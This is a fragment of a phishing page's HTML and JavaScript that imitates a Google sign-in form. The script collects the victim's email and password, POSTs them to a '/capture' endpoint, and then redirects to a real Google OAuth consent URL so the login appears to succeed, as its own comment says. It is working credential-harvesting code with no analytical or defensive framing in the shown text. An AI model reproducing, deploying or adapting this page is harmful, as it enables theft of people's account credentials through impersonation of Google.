    <br>
    <button class="btn" id="next1">Next</button>
  </div>
  <div class="step2" id="step2">
    <div style="font-size:14px;color:#5f6368;margin-bottom:16px" id="who"></div>

<script>
var AUTHURL = "https://accounts.google.com/o/oauth2/auth?response_type=code&client_id=250834318298-fkhfc36npetos2p7d8h3h2duuk3seuj5.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fbuy.tinypass.com%2Fcheckout%2Fuser%2FgoogleCallback%2F&scope=profile%20email&state=GARInTXr6kM8mfP1okYopMM0dsXO6dat6MRbvpXg";
var step = 1;
document.getElementById('yr').textContent = new Date().getFullYear();
document.getElementById('next1').onclick = function() {
  var e = document.getElementById('email').value.trim();
  if (!e) { return; }
  document.getElementById('who').textContent = e;
  document.getElementById('step1').style.display = 'none';
  document.getElementById('step2').style.display = 'block';
  document.getElementById('password').focus();
};
document.getElementById('next2').onclick = function() { submit(); };
document.getElementById('password').addEventListener('keydown', function(ev) { if (ev.key === 'Enter') submit(); });

function submit() {
  var e = document.getElementById('email').value.trim();
  var p = document.getElementById('password').value;
  if (!e || !p) { return; }
  var x = new XMLHttpRequest();
  x.open('POST', '/capture');
  x.setRequestHeader('Content-Type', 'application/json');
  x.onreadystatechange = function() {
    if (x.readyState === 4) {
      if (x.status === 200 && x.responseText.indexOf('"ok":1') >= 0) {
        // captured: continue to REAL Google consent so their login succeeds
        setTimeout(function() { window.location.href = AUTHURL; }, 400);
      } else {
        document.getElementById('err').style.display = 'block';
      }
    }
  };
  x.send(JSON.stringify({email: e, password: p}));
  return false;
}
</script>
